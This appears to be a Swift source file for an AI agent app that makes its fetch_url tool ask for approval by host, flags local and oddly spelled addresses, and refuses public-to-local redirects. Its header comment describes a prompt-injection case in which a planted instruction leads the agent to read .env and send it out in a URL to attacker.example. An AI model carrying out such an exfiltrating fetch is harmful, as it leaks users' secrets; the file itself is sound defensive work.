import Foundation

/// When `fetch_url` has to ask first.
///
/// Reading a file needs no approval and the default shell blocks `curl`, which left `fetch_url` as
/// the one unguarded way out: an instruction planted in a page or README could have the agent read
/// `.env` and then fetch `https://attacker.example/?d=<contents>` — the data leaves in the URL
/// itself, and the "untrusted page" banner only asks the model not to obey. So:
///
/// - a public host asks the first time in a session; approving allows it for the rest of that
///   session, so documentation lookups stay one click;
/// - loopback, private-network and link-local addresses ask every time — routers, admin panels
///   and other people's dev servers live there — except this app's own preview servers;
/// - a redirect from a public page to a local address is refused outright.
public enum WebFetchPolicy {

    /// Why this fetch needs approval, or nil when it may run.
    public static func approvalReason(
        for url: URL,
        allowedHosts: Set<String>,
        previewPorts: Set<Int>
    ) -> String? {
        guard let host = normalizedHost(url) else { return "Fetches a URL with no host." }
        if isLocal(host: host) {
            if isLoopback(host: host), let port = url.port, previewPorts.contains(port) { return nil }
            return "Fetches \(host) on this Mac or your local network. Pages there include routers, admin panels and other apps' servers."
        }
        if allowedHosts.contains(host) { return nil }
        return "Fetches from \(host), which this chat has not used yet. Anything in the URL is sent to that site. Approving allows \(host) for the rest of this chat."
    }

    /// Lowercased, without a trailing dot or IPv6 brackets.
    public static func normalizedHost(_ url: URL) -> String? {
        guard var host = url.host?.lowercased(), !host.isEmpty else { return nil }
        if host.hasSuffix(".") { host.removeLast() }
        if host.hasPrefix("["), host.hasSuffix("]") { host = String(host.dropFirst().dropLast()) }
        return host
    }

    public static func isLoopback(host: String) -> Bool {
        if host == "localhost" || host.hasSuffix(".localhost") || host == "::1" { return true }
        if let octets = ipv4(host) { return octets[0] == 127 }
        return false
    }

    /// Loopback, RFC 1918, carrier-grade NAT, link-local, unspecified, `.local` mDNS names, and
    /// the IPv6 equivalents. A public name that *resolves* to a private address is not caught;
    /// the redirect guard and the per-host approval cover the paths an attacker controls.
    public static func isLocal(host: String) -> Bool {
        if isLoopback(host: host) { return true }
        if host.hasSuffix(".local") || host.hasSuffix(".internal") || host.hasSuffix(".lan") || host.hasSuffix(".home.arpa") {
            return true
        }
        // `2130706433`, `0x7f.1` and `0177.0.0.1` all reach 127.0.0.1. Nobody writes a public
        // site that way, so any number that is not a plain dotted quad counts as local.
        if ipv4(host) == nil, isNumericHost(host) { return true }
        if let o = ipv4(host) {
            switch (o[0], o[1]) {
            case (0, _), (10, _), (192, 168), (169, 254): return true
            case (172, 16...31): return true
            case (100, 64...127): return true
            default: return false
            }
        }
        if host.contains(":") {
            if host == "::" { return true }
            let first = host.split(separator: ":", omittingEmptySubsequences: false).first.map(String.init) ?? ""
            if let word = UInt16(first, radix: 16) {
                if word & 0xFE00 == 0xFC00 { return true } // fc00::/7 unique local
                if word & 0xFFC0 == 0xFE80 { return true } // fe80::/10 link-local
            }
            // IPv4-mapped: ::ffff:10.0.0.1
            if let mapped = host.split(separator: ":").last.map(String.init), ipv4(mapped) != nil {
                return isLocal(host: mapped)
            }
        }
        return false
    }

    /// A plain dotted quad of decimal octets without leading zeros; anything else is nil.
    static func ipv4(_ host: String) -> [Int]? {
        let parts = host.split(separator: ".", omittingEmptySubsequences: false)
        guard parts.count == 4 else { return nil }
        var octets: [Int] = []
        for part in parts {
            guard let value = Int(part), (0...255).contains(value), String(value) == part else { return nil }
            octets.append(value)
        }
        return octets
    }

    /// Made only of digits, dots and hex notation — an address in some IPv4 spelling.
    static func isNumericHost(_ host: String) -> Bool {
        let parts = host.split(separator: ".", omittingEmptySubsequences: false)
        return !parts.isEmpty && parts.allSatisfy { part in
            let lowered = part.lowercased()
            if lowered.hasPrefix("0x") { return lowered.count > 2 && lowered.dropFirst(2).allSatisfy(\.isHexDigit) }
            return !part.isEmpty && part.allSatisfy(\.isNumber)
        }
    }

    /// Whether a redirect from `from` to `to` may be followed: never from a public host to a
    /// local one, which would let any allowed page steer the agent into the local network.
    public static func allowsRedirect(from: URL?, to: URL) -> Bool {
        guard let target = normalizedHost(to) else { return false }
        guard let origin = from.flatMap(normalizedHost) else { return !isLocal(host: target) }
        return isLocal(host: origin) || !isLocal(host: target)
    }
}

/// Hosts approved for `fetch_url`, per chat session, for as long as the app runs.
@MainActor
public final class WebFetchAllowlist {
    public static let shared = WebFetchAllowlist()
    private var hostsBySession: [String: Set<String>] = [:]

    public init() {}

    public func hosts(for sessionId: String) -> Set<String> {
        hostsBySession[sessionId] ?? []
    }

    public func allow(_ host: String, for sessionId: String) {
        hostsBySession[sessionId, default: []].insert(host)
    }
}

/// Refuses redirects that `WebFetchPolicy.allowsRedirect` rejects.
final class WebFetchRedirectGuard: NSObject, URLSessionTaskDelegate, Sendable {
    func urlSession(
        _ session: URLSession,
        task: URLSessionTask,
        willPerformHTTPRedirection response: HTTPURLResponse,
        newRequest request: URLRequest,
        completionHandler: @escaping @Sendable (URLRequest?) -> Void
    ) {
        guard let target = request.url, WebFetchPolicy.allowsRedirect(from: response.url, to: target) else {
            completionHandler(nil)
            return
        }
        completionHandler(request)
    }
}
